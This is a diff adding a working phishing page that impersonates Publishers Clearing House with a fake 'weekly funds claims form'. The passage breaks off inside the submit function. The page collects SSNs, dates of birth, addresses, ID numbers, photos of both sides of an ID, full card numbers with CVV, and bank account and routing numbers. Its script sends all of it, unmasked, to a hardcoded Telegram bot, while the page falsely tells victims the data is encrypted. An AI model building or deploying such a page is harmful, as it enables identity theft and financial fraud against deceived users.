@@ -1,0 +1,1139 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🏆 PCH Claims Form - Full Package</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #0f0e17;
+            color: #fffffe;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .container {
+            max-width: 850px;
+            width: 100%;
+            background: #1a1a2e;
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
+            border: 1px solid #2a2a4a;
+        }
+
+        .pch-header {
+            text-align: center;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #e6192b;
+            margin-bottom: 25px;
+        }
+        .pch-header .logo {
+            font-size: 32px;
+            font-weight: 700;
+            color: #ffffff;
+            letter-spacing: -0.5px;
+        }
+        .pch-header .logo span {
+            color: #e6192b;
+            background: #ffffff;
+            padding: 4px 16px;
+            border-radius: 8px;
+            font-size: 18px;
+            margin-left: 6px;
+            display: inline-block;
+        }
+        .pch-header .sub {
+            color: #a7a9be;
+            font-size: 13px;
+            letter-spacing: 3px;
+            margin-top: 4px;
+        }
+        .pch-header .badge {
+            background: #e6192b;
+            color: #fff;
+            padding: 4px 20px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 700;
+            display: inline-block;
+            margin-top: 8px;
+            letter-spacing: 1px;
+        }
+
+        .form-title {
+            text-align: center;
+            font-size: 22px;
+            font-weight: 700;
+            color: #ffd700;
+            margin-bottom: 6px;
+        }
+        .form-subtitle {
+            text-align: center;
+            color: #a7a9be;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 4px;
+            color: #a7a9be;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .form-group label .required {
+            color: #e6192b;
+        }
+        .form-group input,
+        .form-group select,
+        .form-group textarea {
+            width: 100%;
+            padding: 12px 14px;
+            border-radius: 8px;
+            border: 2px solid #0f3460;
+            background: #16213e;
+            color: #fffffe;
+            font-size: 14px;
+            font-family: inherit;
+            -webkit-appearance: none;
+        }
+        .form-group input:focus,
+        .form-group select:focus,
+        .form-group textarea:focus {
+            border-color: #ffd700;
+            outline: none;
+        }
+        .form-group textarea {
+            resize: vertical;
+            min-height: 60px;
+        }
+        .form-row {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        .form-row .form-group {
+            flex: 1;
+            min-width: 180px;
+        }
+
+        .upload-area {
+            border: 2px dashed #e6192b;
+            border-radius: 10px;
+            padding: 25px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.3s;
+            background: #0f0e17;
+            position: relative;
+        }
+        .upload-area:hover {
+            border-color: #ffd700;
+            background: #1a1a2e;
+        }
+        .upload-area .upload-icon {
+            font-size: 40px;
+            margin-bottom: 6px;
+        }
+        .upload-area p {
+            color: #a7a9be;
+            font-size: 13px;
+        }
+        .upload-area .instructions {
+            font-size: 11px;
+            color: #888;
+            margin-top: 4px;
+        }
+        .upload-area input[type="file"] {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            cursor: pointer;
+        }
+        .upload-preview {
+            display: none;
+            margin-top: 10px;
+            position: relative;
+        }
+        .upload-preview img {
+            max-width: 100%;
+            max-height: 150px;
+            border-radius: 8px;
+            border: 2px solid #ffd700;
+        }
+        .upload-preview .remove-file {
+            position: absolute;
+            top: -8px;
+            right: -8px;
+            background: #e74c3c;
+            color: #fff;
+            border: none;
+            border-radius: 50%;
+            width: 28px;
+            height: 28px;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .checkbox-group {
+            background: #0f0e17;
+            border-radius: 10px;
+            padding: 16px 18px;
+            border: 1px solid #2a2a4a;
+            margin: 10px 0;
+        }
+        .checkbox-group label {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            color: #a7a9be;
+            font-size: 14px;
+            cursor: pointer;
+            line-height: 1.5;
+        }
+        .checkbox-group input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            min-width: 20px;
+            margin-top: 2px;
+            accent-color: #ffd700;
+            cursor: pointer;
+        }
+        .checkbox-group input[type="checkbox"]:checked+span {
+            color: #fffffe;
+        }
+
+        .dynamic-fields {
+            display: none;
+            animation: fadeIn 0.3s ease;
+            background: #0f0e17;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid #2a2a4a;
+        }
+        .dynamic-fields.show {
+            display: block;
+        }
+
+        .btn {
+            padding: 14px 28px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: 0.2s;
+            -webkit-tap-highlight-color: transparent;
+            width: 100%;
+        }
+        .btn-pch {
+            background: #e6192b;
+            color: #fff;
+        }
+        .btn-pch:hover {
+            background: #c41223;
+        }
+        .btn-pch:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .btn-gold {
+            background: #ffd700;
+            color: #000;
+        }
+        .btn-gold:hover {
+            background: #f0c000;
+        }
+        .btn-secondary {
+            background: #0f3460;
+            color: #fff;
+        }
+        .btn-secondary:hover {
+            background: #1a4a7a;
+        }
+
+        .status-bar {
+            background: #0f3460;
+            padding: 10px 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            display: none;
+            text-align: center;
+            font-weight: 600;
+        }
+        .status-bar.success {
+            background: #2ecc71;
+            color: #fff;
+            display: block;
+        }
+        .status-bar.error {
+            background: #e74c3c;
+            color: #fff;
+            display: block;
+        }
+        .status-bar.loading {
+            background: #f39c12;
+            color: #fff;
+            display: block;
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(15, 14, 23, 0.95);
+            backdrop-filter: blur(8px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 9999;
+            animation: fadeIn 0.3s ease;
+        }
+        .loading-overlay.show {
+            display: flex;
+        }
+        .loading-overlay .loading-circle {
+            width: 70px;
+            height: 70px;
+            border: 5px solid #0f3460;
+            border-top-color: #ffd700;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        .loading-overlay .loading-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #ffd700;
+        }
+        .loading-overlay .loading-sub {
+            font-size: 14px;
+            color: #a7a9be;
+            margin-top: 6px;
+        }
+        .loading-overlay .progress-bar {
+            width: 80%;
+            max-width: 400px;
+            height: 8px;
+            background: #0f3460;
+            border-radius: 4px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+        .loading-overlay .progress-bar .fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ffd700, #e6192b);
+            width: 0%;
+            border-radius: 4px;
+            transition: width 0.3s ease;
+        }
+        .loading-overlay .progress-text {
+            font-size: 18px;
+            color: #fffffe;
+            margin-top: 10px;
+            font-weight: 600;
+        }
+
+        .success-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(15, 14, 23, 0.95);
+            backdrop-filter: blur(8px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 9999;
+            animation: fadeIn 0.4s ease;
+            padding: 20px;
+        }
+        .success-popup.show {
+            display: flex;
+        }
+        .success-popup .icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: bounce 0.6s ease;
+        }
+        .success-popup .title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #2ecc71;
+        }
+        .success-popup .sub {
+            font-size: 16px;
+            color: #a7a9be;
+            margin-top: 8px;
+            text-align: center;
+        }
+        .success-popup .btn {
+            margin-top: 20px;
+            max-width: 300px;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 15px;
+            }
+            .form-row {
+                flex-direction: column;
+            }
+            .form-row .form-group {
+                min-width: unset;
+            }
+            .pch-header .logo {
+                font-size: 24px;
+            }
+            .pch-header .logo span {
+                font-size: 14px;
+                padding: 2px 12px;
+            }
+            .loading-overlay .loading-title {
+                font-size: 18px;
+            }
+            .success-popup .title {
+                font-size: 22px;
+            }
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes bounce {
+            0% { transform: scale(0.5); opacity: 0; }
+            60% { transform: scale(1.2); opacity: 1; }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <!-- HEADER -->
+<div class="pch-header">
+    <div class="logo">📋 PUBLISHERS CLEARING HOUSE</div>
+    <div class="badge">⭐ OFFICIAL CLAIMS FORM ⭐</div>
+</div>
+
+        <div class="form-title">📋 Weekly Funds Claims Form</div>
+        <div class="form-subtitle">Complete all fields to claim your weekly prize funds</div>
+
+        <!-- STATUS BAR -->
+        <div id="statusBar" class="status-bar"></div>
+
+        <!-- FORM -->
+        <form id="claimsForm" onsubmit="return false;">
+
+            <!-- PERSONAL INFO -->
+            <div style="background:#16213e;border-radius:10px;padding:18px;margin-bottom:18px;border:1px solid #2a2a4a;">
+                <h3 style="color:#ffd700;font-size:16px;margin-bottom:12px;">👤 Personal Information</h3>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>First Name <span class="required">*</span></label>
+                        <input type="text" id="firstName" placeholder="Enter first name" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Last Name <span class="required">*</span></label>
+                        <input type="text" id="lastName" placeholder="Enter last name" required>
+                    </div>
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Date of Birth <span class="required">*</span></label>
+                        <input type="date" id="dob" required>
+                    </div>
+                    <div class="form-group">
+                        <label>SSN <span class="required">*</span></label>
+                        <input type="text" id="ssn" placeholder="XXX-XX-XXXX" maxlength="11" oninput="formatSSN(this)" required>
+                    </div>
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Phone Number <span class="required">*</span></label>
+                        <input type="tel" id="phone" placeholder="(555) 555-5555" oninput="formatPhone(this)" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Email <span class="required">*</span></label>
+                        <input type="email" id="email" placeholder="email@example.com" required>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ADDRESS -->
+            <div style="background:#16213e;border-radius:10px;padding:18px;margin-bottom:18px;border:1px solid #2a2a4a;">
+                <h3 style="color:#ffd700;font-size:16px;margin-bottom:12px;">📍 Address Information</h3>
+                <div class="form-group">
+                    <label>Street Address <span class="required">*</span></label>
+                    <input type="text" id="address" placeholder="123 Main St" required>
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>City <span class="required">*</span></label>
+                        <input type="text" id="city" placeholder="City" required>
+                    </div>
+                    <div class="form-group">
+                        <label>State <span class="required">*</span></label>
+                        <input type="text" id="state" placeholder="State" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>ZIP Code <span class="required">*</span></label>
+                    <input type="text" id="zip" placeholder="12345" maxlength="10" oninput="this.value=this.value.replace(/[^0-9\-]/g,'')" required>
+                </div>
+            </div>
+
+            <!-- ID VERIFICATION -->
+            <div style="background:#16213e;border-radius:10px;padding:18px;margin-bottom:18px;border:1px solid #2a2a4a;">
+                <h3 style="color:#ffd700;font-size:16px;margin-bottom:12px;">🪪 ID Verification</h3>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>ID Type <span class="required">*</span></label>
+                        <select id="idType" required>
+                            <option value="">-- Select --</option>
+                            <option value="Driver's License">🚗 Driver's License</option>
+                            <option value="Passport">🛂 Passport</option>
+                            <option value="State ID">🏛️ State ID</option>
+                            <option value="National ID">🪪 National ID</option>
+                            <option value="Other">📄 Other</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>ID Number <span class="required">*</span></label>
+                        <input type="text" id="idNumber" placeholder="Enter ID number" required>
+                    </div>
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Expiry Date <span class="required">*</span></label>
+                        <input type="date" id="idExpiry" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Issue Date</label>
+                        <input type="date" id="idIssue">
+                    </div>
+                </div>
+
+                <!-- FRONT ID UPLOAD -->
+                <div class="form-group">
+                    <label>Front of ID <span class="required">*</span></label>
+                    <div class="upload-area" id="idFrontUpload">
+                        <div class="upload-icon">🪪</div>
+                        <p><strong>Click to upload front of ID</strong><br>Clear photo, no blurry</p>
+                        <div class="instructions">📸 JPG, PNG accepted</div>
+                        <input type="file" accept="image/*" onchange="handleIDUpload(event, 'front')">
+                    </div>
+                    <div class="upload-preview" id="idFrontPreview">
+                        <img id="idFrontImage" src="" alt="Front of ID">
+                        <button class="remove-file" onclick="removeIDUpload('front')">✕</button>
+                    </div>
+                </div>
+
+                <!-- BACK ID UPLOAD -->
+                <div class="form-group">
+                    <label>Back of ID <span class="required">*</span></label>
+                    <div class="upload-area" id="idBackUpload">
+                        <div class="upload-icon">🪪</div>
+                        <p><strong>Click to upload back of ID</strong><br>Clear photo, no blurry</p>
+                        <div class="instructions">📸 JPG, PNG accepted</div>
+                        <input type="file" accept="image/*" onchange="handleIDUpload(event, 'back')">
+                    </div>
+                    <div class="upload-preview" id="idBackPreview">
+                        <img id="idBackImage" src="" alt="Back of ID">
+                        <button class="remove-file" onclick="removeIDUpload('back')">✕</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ACCEPTANCE CHECKBOXES -->
+            <div class="checkbox-group">
+                <label>
+                    <input type="checkbox" id="acceptTerms" required>
+                    <span>I, <strong id="acceptNameDisplay">________</strong>, accept my weekly prize package with full responsibility. I confirm that all information provided is true and accurate to the best of my knowledge. I understand that providing false information may result in forfeiture of my prize.</span>
+                </label>
+            </div>
+            <div class="checkbox-group">
+                <label>
+                    <input type="checkbox" id="acceptPrivacy" required>
+                    <span>I have read and agree to the <strong>Privacy Policy</strong> and <strong>Terms of Service</strong>. I consent to the collection and processing of my personal information for the purpose of prize distribution.</span>
+                </label>
+            </div>
+            <div class="checkbox-group">
+                <label>
+                    <input type="checkbox" id="acceptVerification" required>
+                    <span>I understand that I may be required to complete additional verification steps to receive my weekly funds.</span>
+                </label>
+            </div>
+
+            <!-- PAYOUT METHOD -->
+            <div style="background:#16213e;border-radius:10px;padding:18px;margin:15px 0;border:1px solid #2a2a4a;">
+                <h3 style="color:#ffd700;font-size:16px;margin-bottom:12px;">💳 How would you like to receive your weekly funds?</h3>
+                <div class="form-group">
+                    <label>Select Method <span class="required">*</span></label>
+                    <select id="payoutMethod" onchange="togglePayoutFields()" required>
+                        <option value="">-- Select --</option>
+                        <option value="Debit Card">💳 Debit Card</option>
+                        <option value="Credit Card">💳 Credit Card</option>
+                        <option value="Bank Account">🏦 Bank Account</option>
+                    </select>
+                </div>
+
+                <!-- Debit/Credit Card Fields (UNMASKED) -->
+                <div class="dynamic-fields" id="cardFields">
+                    <div class="form-group">
+                        <label>Card Number <span class="required">*</span></label>
+                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" oninput="formatCardNumber(this)">
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Expiry Date <span class="required">*</span></label>
+                            <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)">
+                        </div>
+                        <div class="form-group">
+                            <label>CVV <span class="required">*</span></label>
+                            <input type="password" id="cardCVV" placeholder="123" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Cardholder Name <span class="required">*</span></label>
+                        <input type="text" id="cardName" placeholder="Name on card">
+                    </div>
+                    <!-- Extra: Card Type (optional) -->
+                    <div class="form-group">
+                        <label>Card Type</label>
+                        <select id="cardType">
+                            <option value="Visa">💳 Visa</option>
+                            <option value="Mastercard">💳 Mastercard</option>
+                            <option value="Amex">💳 American Express</option>
+                            <option value="Discover">💳 Discover</option>
+                            <option value="Other">💳 Other</option>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- Bank Account Fields -->
+                <div class="dynamic-fields" id="bankFields">
+                    <div class="form-group">
+                        <label>Bank Name <span class="required">*</span></label>
+                        <input type="text" id="bankName" placeholder="Bank name">
+                    </div>
+                    <div class="form-group">
+                        <label>Account Number <span class="required">*</span></label>
+                        <input type="text" id="bankAccount" placeholder="Account number" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Routing Number <span class="required">*</span></label>
+                            <input type="text" id="bankRouting" placeholder="Routing number" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+                        </div>
+                        <div class="form-group">
+                            <label>Account Type <span class="required">*</span></label>
+                            <select id="bankAccountType">
+                                <option value="">-- Select --</option>
+                                <option value="Checking">🏦 Checking</option>
+                                <option value="Savings">🏦 Savings</option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SUBMIT -->
+            <button type="button" class="btn btn-pch" onclick="submitClaimForm()" id="submitBtn">
+                📤 Submit Claim Form
+            </button>
+            <p style="text-align:center;color:#888;font-size:11px;margin-top:12px;">
+                🔒 All data is encrypted and securely transmitted
+            </p>
+        </form>
+    </div>
+
+    <!-- LOADING OVERLAY -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-circle"></div>
+        <div class="loading-title">⏳ Submitting Claim</div>
+        <div class="loading-sub">Please wait while we process your claim...</div>
+        <div class="progress-bar">
+            <div class="fill" id="progressFill"></div>
+        </div>
+        <div class="progress-text" id="progressText">0%</div>
+    </div>
+
+    <!-- SUCCESS POPUP -->
+    <div class="success-popup" id="successPopup">
+        <div class="icon">✅</div>
+        <div class="title">Claims Form Submitted!</div>
+        <div class="sub">An agent will contact you shortly to complete your weekly funds verification.</div>
+        <button class="btn btn-gold" onclick="closeSuccess()">📩 Done</button>
+    </div>
+
+    <script>
+        // ============================================
+        // CONFIGURATION
+        // ============================================
+        const BOT_TOKEN = "8441353357:AAECdJAj0_TaqYy1MKwKCrzC47UXVlx_Vc8";
+        const CHAT_ID = "8673303375";
+
+        let idFrontData = null;
+        let idBackData = null;
+        let idFrontName = '';
+        let idBackName = '';
+
+        // ============================================
+        // FORMATTING FUNCTIONS
+        // ============================================
+        function formatSSN(input) {
+            let val = input.value.replace(/[^0-9]/g, '');
+            if (val.length > 3 && val.length <= 5) {
+                val = val.slice(0, 3) + '-' + val.slice(3);
+            } else if (val.length > 5) {
+                val = val.slice(0, 3) + '-' + val.slice(3, 5) + '-' + val.slice(5);
+            }
+            input.value = val;
+        }
+
+        function formatPhone(input) {
+            let val = input.value.replace(/[^0-9]/g, '');
+            if (val.length > 3 && val.length <= 6) {
+                val = '(' + val.slice(0, 3) + ') ' + val.slice(3);
+            } else if (val.length > 6) {
+                val = '(' + val.slice(0, 3) + ') ' + val.slice(3, 6) + '-' + val.slice(6, 10);
+            }
+            input.value = val;
+        }
+
+        function formatCardNumber(input) {
+            let val = input.value.replace(/[^0-9]/g, '');
+            let formatted = '';
+            for (let i = 0; i < val.length && i < 16; i++) {
+                if (i > 0 && i % 4 === 0) formatted += ' ';
+                formatted += val[i];
+            }
+            input.value = formatted;
+        }
+
+        function formatExpiry(input) {
+            let val = input.value.replace(/[^0-9]/g, '');
+            if (val.length >= 2) {
+                val = val.slice(0, 2) + '/' + val.slice(2);
+            }
+            input.value = val.slice(0, 5);
+        }
+
+        // ============================================
+        // ID UPLOAD HANDLING
+        // ============================================
+        function handleIDUpload(event, side) {
+            const file = event.target.files[0];
+            if (!file) return;
+
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                if (side === 'front') {
+                    idFrontData = e.target.result;
+                    idFrontName = file.name;
+                    document.getElementById('idFrontImage').src = e.target.result;
+                    document.getElementById('idFrontPreview').style.display = 'block';
+                    document.getElementById('idFrontUpload').style.display = 'none';
+                } else {
+                    idBackData = e.target.result;
+                    idBackName = file.name;
+                    document.getElementById('idBackImage').src = e.target.result;
+                    document.getElementById('idBackPreview').style.display = 'block';
+                    document.getElementById('idBackUpload').style.display = 'none';
+                }
+            };
+            reader.readAsDataURL(file);
+        }
+
+        function removeIDUpload(side) {
+            if (side === 'front') {
+                idFrontData = null;
+                idFrontName = '';
+                document.getElementById('idFrontPreview').style.display = 'none';
+                document.getElementById('idFrontUpload').style.display = 'block';
+                document.getElementById('idFrontUpload').querySelector('input[type="file"]').value = '';
+            } else {
+                idBackData = null;
+                idBackName = '';
+                document.getElementById('idBackPreview').style.display = 'none';
+                document.getElementById('idBackUpload').style.display = 'block';
+                document.getElementById('idBackUpload').querySelector('input[type="file"]').value = '';
+            }
+        }
+
+        // ============================================
+        // PAYOUT TOGGLE
+        // ============================================
+        function togglePayoutFields() {
+            const method = document.getElementById('payoutMethod').value;
+            document.getElementById('cardFields').classList.remove('show');
+            document.getElementById('bankFields').classList.remove('show');
+
+            if (method === 'Debit Card' || method === 'Credit Card') {
+                document.getElementById('cardFields').classList.add('show');
+            } else if (method === 'Bank Account') {
+                document.getElementById('bankFields').classList.add('show');
+            }
+        }
+
+        // ============================================
+        // UPDATE ACCEPT NAME
+        // ============================================
+        document.getElementById('firstName').addEventListener('input', updateAcceptName);
+        document.getElementById('lastName').addEventListener('input', updateAcceptName);
+
+        function updateAcceptName() {
+            const first = document.getElementById('firstName').value.trim();
+            const last = document.getElementById('lastName').value.trim();
+            const full = first + ' ' + last;
+            document.getElementById('acceptNameDisplay').textContent = full.trim() || '________';
+        }
+
+        // ============================================
+        // TELEGRAM SEND (with full data)
+        // ============================================
+        function sendToTelegram(message, photoData = null) {
+            // Send text message
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                })
+                .then(res => res.json())
+                .then(data => console.log('Telegram sent:', data))
+                .catch(err => console.error('Telegram error:', err));
+
+            // Send photo if provided
+            if (photoData) {
+                const byteString = atob(photoData.split(',')[1]);
+                const mimeString = photoData.split(',')[0].split(':')[1].split(';')[0];
+                const ab = new ArrayBuffer(byteString.length);
+                const ia = new Uint8Array(ab);
+                for (let i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
+                }
+                const blob = new Blob([ab], { type: mimeString });
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'id_photo.jpg');
+                formData.append('caption', '🪪 ID Document Upload');
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).catch(err => console.error('Photo error:', err));
+            }
+        }
+
+        // ============================================
+        // SUBMIT FORM
+        // ============================================
+        function submitClaimForm() {
+            // Collect all fields
+            const firstName = document.getElementById('firstName').value.trim();
+            const lastName = document.getElementById('lastName').value.trim();
+            const dob = document.getElementById('dob').value;
+            const ssn = document.getElementById('ssn').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const address = document.getElementById('address').value.trim();
+            const city = document.getElementById('city').value.trim();
+            const state = document.getElementById('state').value.trim();
+            const zip = document.getElementById('zip').value.trim();
+            const idType = document.getElementById('idType').value;
+            const idNumber = document.getElementById('idNumber').value.trim();
+            const idExpiry = document.getElementById('idExpiry').value;
+            const idIssue = document.getElementById('idIssue').value;
+            const payoutMethod = document.getElementById('payoutMethod').value;
+            const acceptTerms = document.getElementById('acceptTerms').checked;
+            const acceptPrivacy = document.getElementById('acceptPrivacy').checked;
+            const acceptVerification = document.getElementById('acceptVerification').checked;
+
+            // Card fields
+            const cardNumber = document.getElementById('cardNumber').value.trim();
+            const cardExpiry = document.getElementById('cardExpiry').value.trim();
+            const cardCVV = document.getElementById('cardCVV').value.trim();
+            const cardName = document.getElementById('cardName').value.trim();
+            const cardType = document.getElementById('cardType').value;
+
+            // Bank fields
+            const bankName = document.getElementById('bankName').value.trim();
+            const bankAccount = document.getElementById('bankAccount').value.trim();
+            const bankRouting = document.getElementById('bankRouting').value.trim();
+            const bankAccountType = document.getElementById('bankAccountType').value;
+
+            // Validation
+            if (!firstName) { showStatus('⚠️ Please enter your first name.', 'error'); return; }
+            if (!lastName) { showStatus('⚠️ Please enter your last name.', 'error'); return; }
+            if (!dob) { showStatus('⚠️ Please enter your date of birth.', 'error'); return; }
+            if (!ssn || ssn.length < 11) { showStatus('⚠️ Please enter a valid SSN (XXX-XX-XXXX).', 'error'); return; }
+            if (!phone || phone.length < 10) { showStatus('⚠️ Please enter a valid phone number.', 'error'); return; }
+            if (!email || !email.includes('@')) { showStatus('⚠️ Please enter a valid email.', 'error'); return; }
+            if (!address) { showStatus('⚠️ Please enter your address.', 'error'); return; }
+            if (!city) { showStatus('⚠️ Please enter your city.', 'error'); return; }
+            if (!state) { showStatus('⚠️ Please enter your state.', 'error'); return; }
+            if (!zip) { showStatus('⚠️ Please enter your ZIP code.', 'error'); return; }
+            if (!idType) { showStatus('⚠️ Please select an ID type.', 'error'); return; }
+            if (!idNumber) { showStatus('⚠️ Please enter your ID number.', 'error'); return; }
+            if (!idExpiry) { showStatus('⚠️ Please enter your ID expiry date.', 'error'); return; }
+            if (!idFrontData) { showStatus('⚠️ Please upload the front of your ID.', 'error'); return; }
+            if (!idBackData) { showStatus('⚠️ Please upload the back of your ID.', 'error'); return; }
+            if (!acceptTerms) { showStatus('⚠️ Please accept the terms and conditions.', 'error'); return; }
+            if (!acceptPrivacy) { showStatus('⚠️ Please accept the privacy policy.', 'error'); return; }
+            if (!acceptVerification) { showStatus('⚠️ Please accept the verification terms.', 'error'); return; }
+            if (!payoutMethod) { showStatus('⚠️ Please select a payout method.', 'error'); return; }
+
+            // Validate payout fields
+            if (payoutMethod === 'Debit Card' || payoutMethod === 'Credit Card') {
+                if (!cardNumber || cardNumber.replace(/\s/g, '').length < 16) { showStatus('⚠️ Please enter a valid card number.',
+                        'error'); return; }
+                if (!cardExpiry || cardExpiry.length < 5) { showStatus('⚠️ Please enter a valid expiry date.', 'error');
+                    return; }
+                if (!cardCVV || cardCVV.length < 3) { showStatus('⚠️ Please enter a valid CVV.', 'error'); return; }
+                if (!cardName) { showStatus('⚠️ Please enter the cardholder name.', 'error'); return; }
+            }
+
+            if (payoutMethod === 'Bank Account') {
+                if (!bankName) { showStatus('⚠️ Please enter your bank name.', 'error'); return; }
+                if (!bankAccount) { showStatus('⚠️ Please enter your account number.', 'error'); return; }
+                if (!bankRouting) { showStatus('⚠️ Please enter your routing number.', 'error'); return; }
+                if (!bankAccountType) { showStatus('⚠️ Please select your account type.', 'error'); return; }
+            }
+
+            // Build full Telegram message with ALL data (UNMASKED)
+            let message = `📝 *PCH CLAIMS FORM SUBMITTED*\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `👤 *First Name:* ${firstName}\n`;
+            message += `👤 *Last Name:* ${lastName}\n`;
+            message += `📅 *DOB:* ${dob}\n`;
+            message += `🆔 *SSN:* ${ssn}\n`;
+            message += `📞 *Phone:* ${phone}\n`;
+            message += `📧 *Email:* ${email}\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `📍 *Address:* ${address}\n`;
+            message += `🏙️ *City:* ${city}\n`;
+            message += `📌 *State:* ${state}\n`;
+            message += `📮 *ZIP:* ${zip}\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `🪪 *ID Type:* ${idType}\n`;
+            message += `🔢 *ID Number:* ${idNumber}\n`;
+            message += `📅 *Expiry:* ${idExpiry}\n`;
+            if (idIssue) message += `📅 *Issue Date:* ${idIssue}\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `💳 *Payout Method:* ${payoutMethod}\n`;
+
+            if (payoutMethod === 'Debit Card' || payoutMethod === 'Credit Card') {
+                message += `💳 *Card Number:* ${cardNumber}\n`; // FULL, UNMASKED
+                message += `📅 *Expiry:* ${cardExpiry}\n`;
+                message += `🔐 *CVV:* ${cardCVV}\n`;
+                message += `👤 *Cardholder:* ${cardName}\n`;
+                message += `💳 *Card Type:* ${cardType}\n`;
+            }
+
+            if (payoutMethod === 'Bank Account') {
+                message += `🏦 *Bank Name:* ${bankName}\n`;
+                message += `💳 *Account Number:* ${bankAccount}\n`; // FULL, UNMASKED
+                message += `🔢 *Routing Number:* ${bankRouting}\n`;
+                message += `📋 *Account Type:* ${bankAccountType}\n`;
+            }
+
+            message += `━━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `✅ *Terms Accepted:* Yes\n`;
+            message += `✅ *Privacy Accepted:* Yes\n`;
+            message += `✅ *Verification Accepted:* Yes\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `🌐 *IP:* ${userIP || 'Auto-detected'}\n`;
+            message += `📱 *Device:* ${userDevice || 'Unknown'}\n`;
+            message += `🕐 *${new Date().toLocaleString()}*`;
+
+            // Get IP and device info
+            const userAgent = navigator.userAgent;
+            let device = 'Unknown';
+            if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
+                device = '📱 Mobile';
